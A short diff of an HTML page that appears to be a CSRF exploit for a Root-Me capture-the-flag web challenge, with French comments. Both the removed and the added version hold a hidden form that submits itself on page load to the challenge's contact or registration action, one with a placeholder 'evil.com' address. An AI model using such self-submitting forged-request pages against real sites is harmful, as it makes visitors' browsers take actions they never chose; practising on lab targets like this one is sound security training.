@@ -1,13 +1,12 @@
 <html>
-  <body>
-    <form id="csrfForm" action="http://challenge01.root-me.org/web-client/ch22/?action=contact" method="POST">
-      <input type="hidden" name="name" value="Hacker">
-      <input type="hidden" name="email" value="hacker@evil.com">
-      <input type="hidden" name="message" value="Je contrôle ce formulaire 😈">
-    </form>
-
-    <script>
-      document.getElementById("csrfForm").submit(); // Envoie auto dès que la page est chargée
-    </script>
-  </body>
+    <body>
+        <form id="csrf-form" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=register" method="POST">
+            <input type="hidden" name="username" value="test">
+            <input type="hidden" name="password" value="test">
+        </form>
+        <script>
+            // Soumettre automatiquement le formulaire
+            document.getElementById('csrf-form').submit();
+        </script>
+    </body>
 </html>
